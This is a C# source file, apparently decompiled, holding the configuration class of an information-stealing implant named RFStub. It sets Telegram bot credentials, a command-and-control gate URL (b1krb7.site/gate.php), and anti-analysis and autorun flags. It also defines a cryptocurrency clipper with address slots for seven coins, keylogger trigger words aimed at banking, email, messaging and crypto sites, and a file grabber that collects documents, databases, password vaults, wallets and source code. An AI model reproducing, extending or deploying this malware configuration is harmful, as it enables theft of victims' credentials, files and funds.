using System.Collections.Generic;
using RFStub.Implant;

namespace RFStub;

internal sealed class Config
{
	public static string TelegramAPI = "xscdvfbgnhmj";

	public static string TelegramID = "dcvfbgnhjm";

	public static string Mutex = "xscdvfbgnhmj";

	public static string AntiAnalysis = "0";

	public static string Autorun = "0";

	public static string StartDelay = "5";

	public static string link = "http://b1krb7.site/gate.php";

	public static string WebcamScreenshot = "0";

	public static string KeyloggerModule = "0";

	public static string ClipperModule = "0";

	public static Dictionary<string, string> ClipperAddresses = new Dictionary<string, string>
	{
		{ "btc", "--- ClipperBTC ---" },
		{ "eth", "--- ClipperETH ---" },
		{ "xmr", "--- ClipperXMR ---" },
		{ "xlm", "--- ClipperXLM ---" },
		{ "xrp", "--- ClipperXRP ---" },
		{ "ltc", "--- ClipperLTC ---" },
		{ "bch", "--- ClipperBCH ---" }
	};

	public static string[] KeyloggerServices = new string[35]
	{
		"facebook", "twitter", "chat", "telegram", "skype", "discord", "viber", "message", "gmail", "protonmail",
		"outlook", "password", "encryption", "account", "login", "key", "sign in", "пароль", "bank", "банк",
		"credit", "card", "кредит", "shop", "buy", "sell", "купить", "binance", "luno", "cryptowall",
		"whatsapp", "drive", "reciepts", "payment", "important"
	};

	public static string[] BankingServices = new string[9] { "qiwi", "money", "exchange", "bank", "credit", "card", "банк", "western", "кредит" };

	public static string[] CryptoServices = new string[23]
	{
		"bitcoin", "monero", "dashcoin", "litecoin", "etherium", "stellarcoin", "btc", "eth", "xmr", "xlm",
		"xrp", "ltc", "bch", "blockchain", "paxful", "investopedia", "buybitcoinworldwide", "cryptocurrency", "crypto", "trade",
		"trading", "биткоин", "wallet"
	};

	public static string[] PornServices = new string[7] { "porn", "sex", "hentai", "порно", "sex", "xxx", "xvideo" };

	public static int GrabberSizeLimit = 5120;

	public static Dictionary<string, string[]> GrabberFileTypes = new Dictionary<string, string[]>
	{
		["Document"] = new string[11]
		{
			"pdf", "rtf", "doc", "docx", "xls", "xlsx", "ppt", "pptx", "indd", "txt",
			"json"
		},
		["DataBase"] = new string[14]
		{
			"db", "db3", "db4", "kdb", "kdbx", "sql", "sqlite", "mdf", "mdb", "dsk",
			"dbf", "wallet", "ini", "dat"
		},
		["SourceCode"] = new string[19]
		{
			"c", "cs", "cpp", "asm", "sh", "py", "pyw", "html", "css", "php",
			"go", "js", "rb", "pl", "swift", "java", "kt", "kts", "ino"
		},
		["Image"] = new string[7] { "jpg", "jpeg", "png", "bmp", "psd", "svg", "ai" }
	};

	public static void Init()
	{
		if (ClipperModule == "1")
		{
			ClipperAddresses["btc"] = StringsCrypt.DecryptConfig(ClipperAddresses["btc"]);
			ClipperAddresses["eth"] = StringsCrypt.DecryptConfig(ClipperAddresses["eth"]);
			ClipperAddresses["xmr"] = StringsCrypt.DecryptConfig(ClipperAddresses["xmr"]);
			ClipperAddresses["xlm"] = StringsCrypt.DecryptConfig(ClipperAddresses["xlm"]);
			ClipperAddresses["xrp"] = StringsCrypt.DecryptConfig(ClipperAddresses["xrp"]);
			ClipperAddresses["ltc"] = StringsCrypt.DecryptConfig(ClipperAddresses["ltc"]);
			ClipperAddresses["bch"] = StringsCrypt.DecryptConfig(ClipperAddresses["bch"]);
		}
	}
}
